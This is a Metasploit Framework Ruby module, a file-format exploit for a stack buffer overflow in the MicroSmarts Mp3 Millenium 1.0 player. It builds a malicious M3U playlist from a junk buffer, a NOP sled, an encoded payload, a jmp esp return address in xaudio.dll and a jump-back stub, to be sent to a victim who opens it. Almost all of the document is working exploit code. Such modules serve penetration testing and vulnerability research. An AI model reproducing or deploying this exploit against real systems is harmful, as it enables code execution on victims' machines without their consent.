##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MicroSmarts LLC Mp3 Millenium 1.0 (M3U File) Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Mp3 Millenium 1.0 mp3
				player. An attacker must send the file to victim and the victim must open the file.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [
					'NeoCortex', # Vulnerability Discovery
					'corelanc0d3r', # Exploit tutorial
					'Redsadic <julian.vilas[at]gmail.com>', # Metasploit module
			],
			'References'     =>
				[
					[ 'BID', '40602' ],
				],
			'Payload'        =>
				{
					'Space'    => 300,
					'BadChars' => "\x00\x0a\x0d\x09\x1a",
					'PrependEncoder' => "\x81\xc4\xf0\xef\xff\xff"
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					# Tested by redsadic - 20130716 xpsp3
					[ 'Windows Universal', { 'Ret' => 0x1003565d , 'Offset' => 2040 } ], # jmp esp - xaudio.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jan 19 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'sploit.m3u']),
			], self.class)

	end

	def exploit

		total_length = 2064

		header = "http://A"

		junk = rand_text_alpha_upper(1510)
		junk << make_nops(25) # nopsled

		# junk after payload
		junk2 = rand_text_alpha_upper(target['Offset'] - header.length - junk.length - payload.encoded.length)

		# small buffer to jump backwards to the shellcode
		jumpback = make_nops(3)
		jumpback << Metasm::Shellcode.assemble(Metasm::Ia32.new, "add esp, -" + (127).to_s).encode_string * 4
		jumpback << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp esp").encode_string

		sploit = header
		sploit << junk
		sploit << payload.encoded
		sploit << junk2
		sploit << [target.ret].pack('V')
		sploit << jumpback

		junk3 = rand_text_alpha_upper(total_length - sploit.length)

		sploit << junk3


		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end
end
